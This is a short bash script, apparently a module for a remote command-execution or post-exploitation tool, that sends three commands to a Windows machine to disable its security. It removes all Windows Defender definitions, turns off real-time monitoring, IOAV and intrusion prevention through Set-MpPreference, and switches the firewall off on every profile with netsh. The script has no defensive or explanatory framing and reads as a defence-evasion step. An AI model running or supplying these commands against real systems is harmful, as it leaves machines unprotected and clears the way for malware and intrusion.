#!/bin/bash

: '
Disable Windows Defender and Firewall.
'

execute_command "cmd.exe /c \"C:\Program Files\Windows Defender\MpCmdRun.exe\" -removedefinitions -all"
create_new_line

execute_command "Set-MpPreference -DisableIntrusionPreventionSystem \$true -DisableIOAVProtection \$true -DisableRealtimeMonitoring \$true"
create_new_line

execute_command "NetSh Advfirewall set allprofiles state off"
create_new_line
